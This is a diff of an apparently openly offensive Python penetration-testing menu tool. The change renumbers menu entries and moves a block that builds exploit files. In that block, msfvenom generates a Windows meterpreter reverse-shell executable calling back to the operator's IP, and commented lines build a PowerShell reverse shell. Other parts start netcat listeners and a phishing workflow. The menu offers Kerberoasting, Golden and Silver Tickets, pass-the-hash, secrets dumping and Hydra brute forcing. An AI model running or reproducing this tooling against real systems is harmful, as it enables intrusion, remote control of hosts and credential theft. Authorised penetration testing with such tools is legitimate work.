@@ -537,17 +537,17 @@ def display():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS SERVER  (12) Re/Set SERVERTIME (21) GetArch (31) WinDap Search  (41) Kerberos Info  (51) Golden PAC  (61) GenSSHKeyID  (78) Hydra FTP  (89) FTP    " + '\u2551')
-   print('\u2551' + "(02) Re/Set REMOTE IP   (13) Whois DNS SERVER  (22) NetView (32) Lookup SIDs    (42) KerbUserFilter (52) Domain Dump (62) GenListUSER  (79) Hydra SSH  (90) SSH    " + '\u2551')
-   print('\u2551' + "(03) Re/Set LIVE PORTS  (14) dig DNS SERVER    (23) Service (33) SamDump Users  (43) KerbBruteForce (53) *BloodHound (63) GenListPASS  (80) Hydra SMB  (91) SSH ID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEB ADDRESS (15) Recon DNS SERVER  (24) AtExec  (34) REGistryValues (44) KerbRoasting   (54) *BH ACLPwn  (64) Editor USER  (81) Hydra POP3 (92) Telnet " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER NAME   (16) Dump DNS SERVER   (25) DcomExe (35) List EndPoints (45) KerbASREPRoast (55) SecretsDump (65) Editor PASS  (82) Hydra HTTP (93) NetCat " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS WORD   (17) NMap LIVE PORTS   (26) PsExec  (36) Rpc Client     (46) PASSWORD2HASH  (56) CrackMapExe (66) Editor HASH  (83) Hydra TOM  (94) SQSH   " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM HASH   (18) NMap PORT Service (27) SmbExec (37) Smb Client     (47) HASHES Spray   (57) PSExec HASH (67) Editor HOST  (84) MSF TOMCAT (95) MSSQL  " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap SubDOMAINS   (28) WmiExec (38) SmbMap SHARE   (48) Pass the HASH  (58) SmbExecHASH (74) Man Phishing (85) RemoteSync (96) MySQL  " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Server TIME  (29) IfMap   (39) SmbCopy Files  (49) Silver Ticket  (59) WmiExecHASH (75) AutoPhishing (86) RSyncDumps (97) WinRm  " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN SID                         (30) OpDump  (40) SmbMount SHARE (50) Golden Ticket  (60) NTDSDecrypt (76) GoBuster     (87) RDesktop   (98)        " + '\u2551')
-   print('\u2551' + "(11) Re/Set SHARE NAME                                                                                               (77) Nikto Scan   (88) XDesktop   (99) Exit   " + '\u2551')
+   print('\u2551' + "(01) Re/Set DNS SERVER  (12) Set SERVER TIME   (21) GetArch (31) WinDap Search   (41) Kerberos Info (51) Golden PAC  (61) Editor USER (78) Hydra FTP  (89) FTP     " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE IP   (13) Whois DNS SERVER  (22) NetView (32) Lookup SIDs     (42) KerberoFilter (52) Domain Dump (62) Editor PASS (79) Hydra SSH  (90) SSH     " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE PORTS  (14) dig   DNS SERVER  (23) Service (33) Sam Dump Users  (43) KerberosBrute (53) *BloodHound (63) Editor HASH (80) Hydra SMB  (91) SSH ID  " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEB ADDRESS (15) Recon DNS SERVER  (24) AtExec  (34) REGistry Values (44) Kerberoasting (54) *BH ACLPwn  (64) Editor HOST (81) Hydra POP3 (92) Telnet  " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER NAME   (16) Dump  DNS SERVER  (25) DcomExe (35) List End Points (45) Kerbero Spray (55) SecretsDump (65) GenSSHkeyID (82) Hydra HTTP (93) NetCat  " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS WORD   (17) NMap LIVE PORTS   (26) PsExec  (36) Rpc Client      (46) PASSWORD2HASH (56) CrackMapExe (66) GenListUser (83) Hydra TOM  (94) SQSH    " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM HASH   (18) NMap PORTServices (27) SmbExec (37) Smb Client      (47) HASH Sprayer  (57) PSExec HASH (67) GenListPass (84) MSF TOMCAT (95) MSSQL   " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS  (28) WmiExec (38) Smb Map SHARES  (48) Pass the HASH (58) SmbExecHASH (74) GenPhishCod (85) RemoteSync (96) MySQL   " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap SERVER TIME  (29) IfMap   (39) Smb Dump Files  (49) Silver Ticket (59) WmiExecHASH (75) AutoPhisher (86) RSyncDumps (97) WinRm   " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN SID                         (30) OpDump  (40) Smb Mount SHARE (50) Golden Ticket (60) NTDSDecrypt (76) GoBuster    (87) RDesktop   (98)         " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE NAME                                                                                               (77) Nikto Scan  (88) XDesktop   (99) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -705,19 +705,6 @@ else:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Set up local exploit files.
-# Modified: N/A                                                               	
-# -------------------------------------------------------------------------------------
-
-print("[*] Creating exploit files...")
-# command("cp " + httpDir + "/template.txt " + httpDir + "/reverseshell.ps1")
-# command('echo Invoke-PowerShellTcp -Reverse -IPAddress ' + localIP + ' -Port 9001 >> ' + httpDir + '/reverseshell.ps1')
-command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -f exe -o " + httpDir + "/winshell.exe > /dev/null 2>&1")
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub                                                               
-# Version : TREADSTONE                                                             
 # Details : Start HTTP server.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -778,7 +765,18 @@ command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Retu
 command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return")
 command("xdotool key Ctrl+Shift+Tab")
 
-command("sleep 5")
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Set up local exploit files.
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
+
+print("[*] Creating exploit files...")
+# command("cp " + httpDir + "/template.txt " + httpDir + "/reverseshell.ps1")
+# command('echo Invoke-PowerShellTcp -Reverse -IPAddress ' + localIP + ' -Port 9001 >> ' + httpDir + '/reverseshell.ps1')
+command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -f exe -o " + httpDir + "/winshell.exe > /dev/null 2>&1")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -2405,6 +2403,63 @@ while True:
       else:
             print("[*] Please ensure that any missing files are placed in the work folder...")
       prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Nano usernames.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='61':
+      command("nano " + dataDir + "/usernames.txt")      
+      for x in range (0, maxUser):
+         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
+         USER[x] = spacePadding(USER[x], COL3)         
+      prompt()
+            
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Nano passwords.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='62':
+      command("nano " + dataDir + "/passwords.txt")      
+      for x in range (0, maxUser):
+         HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
+         HASH[x] = spacePadding(HASH[x], COL4)     
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Editor  hashes.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='63':
+      command("nano " + dataDir + "/hashes.txt")           
+      for x in range (0, maxUser):
+            HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
+            HASH[x] = spacePadding(HASH[x], COL4)                        
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Editor hosts.conf
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='64':
+      command("nano /etc/hosts")
+      prompt()    
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2414,7 +2469,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='61':
+   if selection =='65':
       print("[*] Generating Keys...\n")
       command("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
       command("tput setaf 2; tput bold")
@@ -2435,7 +2490,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='62':
+   if selection =='66':
       checkParams = testOne()   
       if checkParams != 1:
          if WEB[:1] != "":
@@ -2463,7 +2518,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='63':
+   if selection =='67':
       checkParams = testOne()     
       if checkParams != 1:
          if WEB[:5] != "EMPTY":
@@ -2478,65 +2533,7 @@ while True:
             command("sed -i '/#/d' " + dataDir + "/passwords.txt 2>&1")
             command("sed -i '/Email addresses found/d' " + dataDir + "/passwords.txt 2>&1")
             command("sed -i '/---------------------/d' " + dataDir + "/passwords.txt 2>&1")
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Nano usernames.txt
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='64':
-      command("nano " + dataDir + "/usernames.txt")      
-      for x in range (0, maxUser):
-         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-         USER[x] = spacePadding(USER[x], COL3)         
-      prompt()
-            
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Nano passwords.txt
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='65':
-      command("nano " + dataDir + "/passwords.txt")      
-      for x in range (0, maxUser):
-         HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
-         HASH[x] = spacePadding(HASH[x], COL4)     
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Editor  hashes.txt
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='66':
-      command("nano " + dataDir + "/hashes.txt")           
-      for x in range (0, maxUser):
-            HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
-            HASH[x] = spacePadding(HASH[x], COL4)                        
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Editor hosts.conf
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='67':
-      command("nano /etc/hosts")
-      prompt()
-      
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2578,7 +2575,7 @@ while True:
          checkParams = 1         
       if checkParams != 1:
          command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return; sleep 2")
+         command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return")
          command("xdotool type 'clear; cat ; + dataDir + '/banner5.txt'; xdotool key Return")
          command("xdotool type 'nc -nvlp 80'; xdotool key Return")
          command("xdotool key Ctrl+Shift+Tab")
